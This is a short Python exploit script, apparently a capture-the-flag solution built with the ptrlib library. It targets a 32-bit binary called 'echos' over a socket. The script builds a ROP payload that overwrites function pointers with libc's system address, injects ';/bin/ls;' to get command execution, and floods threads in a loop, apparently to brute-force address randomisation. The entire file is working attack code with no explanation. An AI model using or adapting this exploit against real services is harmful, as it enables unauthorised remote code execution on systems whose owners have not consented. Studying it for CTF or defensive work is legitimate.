from ptrlib import *
import time
import threading
rop_ret = 0x08048436

rop_pop_edi_ebp = 0x08048a8a
rop_leave_ret = 0x08048696

log.level = ["warning"]
system = 0x3ada0

def worker():
    base = 0x804a0a0
    #libc_system = 0xf7f7fcb0 - 945328 + 0x809c0#250368
    libc_system = 0xf7f7fb00 - 0xd5b00 + system
    payload = b"\xf7\xf7" # read
    payload += p32(rop_ret)
    payload += p32(rop_ret)
    payload += p32(rop_ret)
    payload += p32(rop_ret)
    payload += p32(rop_ret)
    payload += p32(rop_ret)
    payload += p32(rop_ret) # write
    payload += p32(rop_ret)
    payload += p32(rop_ret)
    payload += p32(rop_ret)
    payload += p32(libc_system) # atoi
    payload += p32(rop_ret)

    #sock = Socket("10.66.20.180", 3000)
    #sock = Process("./echos")
    sock = Socket("localhost", 9999)
    sock.sendline("8000")
    sock.send(payload)
    time.sleep(0.5)
    sock.sendline(";/bin/ls;")
    sock.sendline(";/bin/ls;")
    sock.recvline()
    print(sock.recv())
    print(sock.recv())

while True:
    th = threading.Thread(target=worker, args=())
    th.start()
    time.sleep(0.1)
